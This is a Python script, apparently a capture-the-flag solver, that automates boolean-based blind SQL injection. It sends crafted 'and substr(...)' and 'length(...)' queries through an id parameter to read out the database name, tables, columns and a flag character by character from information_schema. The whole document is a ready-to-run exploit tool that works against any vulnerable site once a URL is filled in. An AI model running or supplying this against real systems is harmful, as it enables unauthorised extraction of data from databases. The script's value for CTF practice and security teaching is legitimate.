'''Bool Type SQL Injection'''
import httpx

URL = ''
SUCCESS_MARK = "query_success"   #! 页面回显表明查询成功的标志
ASCII_RANGE = range(ord('a'),1+ord('z'))
STR_RANGE = [123,125] + list(ASCII_RANGE) + list(range(48,58)) #! flag的字符范围列表，包括花括号、a-z，数字0-9
''' httpx实现异步发送请求,本脚本将改进为异步执行
import asyncio
import httpx

async def send_request():
    async with httpx.AsyncClient() as client:
        response = await client.get('https://api.example.com')
        print(response.status_code)
        print(response.text)

# 启动异步事件循环并运行请求
loop = asyncio.get_event_loop()
loop.run_until_complete(send_request())

'''
def get_length_of_database():
    '''获取数据库名字长度'''
    i = 1
    while True:
        resp = httpx.get(URL + f"?id=1 and length(database())={i}")
        if SUCCESS_MARK in resp.text:
            return i
        i = i + 1

def get_database(length_of_database):
    '''获取数据库名'''
    name = ""
    for i in range(length_of_database):
        for j in ASCII_RANGE:
            resp = httpx.get(URL + f"?id=1 and substr(database(),{i+1},1)='{chr(j)}'")
            if SUCCESS_MARK in resp.text:
                name += chr(j)
                break
    return name

def get_number_of_tables(database):
    '''获取指定库的表数量'''
    i = 1
    while True:
        resp = httpx.get(URL + f"?id=1 and (select count(*) from information_schema.tables where table_schema='{database}')={i}")
        if SUCCESS_MARK in resp.text:
            return i
        i = i + 1

def get_length_of_tables(database,count_of_tables):
    '''获取指定库所有表的表名长度'''
    length_list=[]
    for i in range(count_of_tables):
        j = 1
        while True:
            resp = httpx.get(URL + f"?id=1 and length((select table_name from information_schema.tables where table_schema='{database}' limit {i},1))={j}")
            if SUCCESS_MARK in resp.text:
                length_list.append(j)
                break
            j = j + 1
    return length_list

def get_tables(database,count_of_tables,length_list):
    '''获取指定库所有表的表名'''
    tables=[]
    for i in range(count_of_tables):
        name = ""
        for j in range(length_list[i]):
            for k in ASCII_RANGE:
                resp = httpx.get(URL + f"?id=1 and substr((select table_name from information_schema.tables where table_schema='{database}' limit {i},1),{j+1},1)='{chr(k)}'")
                if SUCCESS_MARK in resp.text:
                    name = name + chr(k)
                    break
        tables.append(name)
    return tables

def get_number_of_columns(table):
    '''获取指定表的列数量'''
    i = 1
    while True:
        resp = httpx.get(URL + f"?id=1 and (select count(*) from information_schema.columns where table_name='{table}')={i}")
        if SUCCESS_MARK in resp.text:
            return i
        i = i + 1

def get_length_list_of_columns(database,table,count_of_column):
    '''获取指定库指定表的所有列的列名长度'''
    length_list=[]
    for i in range(count_of_column):
        j = 1
        while True:
            resp = httpx.get(URL + f"?id=1 and length((select column_name from information_schema.columns where table_schema='{database}' and table_name='{table}' limit {i},1))={j}")
            if SUCCESS_MARK in resp.text:
                length_list.append(j)
                break
            j = j + 1
    return length_list

def get_columns(database,table,count_of_columns,length_list):
    '''获取指定库指定表的所有列名'''
    columns = []
    for i in range(count_of_columns):
        name = ""
        for j in range(length_list[i]):
            for k in ASCII_RANGE:
                resp = httpx.get(URL + f"?id=1 and substr((select column_name from information_schema.columns where table_schema='{database}' and table_name='{table}' limit {i},1),{j+1},1)='{chr(k)}'")
                if SUCCESS_MARK in resp.text:
                    name = name + chr(k)
                    break
        columns.append(name)
    return columns

def get_data(database,table,column,str_list):
    '''对指定库指定表指定列爆数据（flag）'''
    j = 1
    while True:
        for i in str_list:
            resp = httpx.get(URL + f"?id=1 and substr((select {column} from {database}.{table}),{j},1)='{chr(i)}'")
            if SUCCESS_MARK in resp.text:
                print(chr(i),end="")
                if chr(i) == "}":
                    print()
                    return 1
                break
        j = j + 1

if __name__ == '__main__':
    print("Judging the number of tables in the database...")
    database = get_database(get_length_of_database())
    count_of_tables = get_number_of_tables(database)
    print(f"[+]There are {count_of_tables} tables in this database")
    print()
    print("Getting the table name...")
    length_list_of_tables = get_length_of_tables(database,count_of_tables)
    tables = get_tables(database,count_of_tables,length_list_of_tables)
    for i in tables:
        print(f"[+]{i}")
    print(f"The table names in this database are : {tables}")
    i = input("Select the table name:")
    if i not in tables:
        print("Error!")
        exit()
    print()
    print(f"Getting the column names in the {i} table......")
    count_of_columns = get_number_of_columns(i)
    print("[+]There are {count_of_columns} tables in the {i} table")
    length_list_of_columns = get_length_list_of_columns(database,i,count_of_columns)
    columns = get_columns(database,i,count_of_columns,length_list_of_columns)
    print("[+]The column(s) name in {i} table is:{columns}")
    j = input("Select the column name:")
    if j not in columns:
        print("Error!")
        exit()
    print()
    print("Getting the flag......")
    print("[+]The flag is ",end="")
    get_data(database,i,j,STR_RANGE)
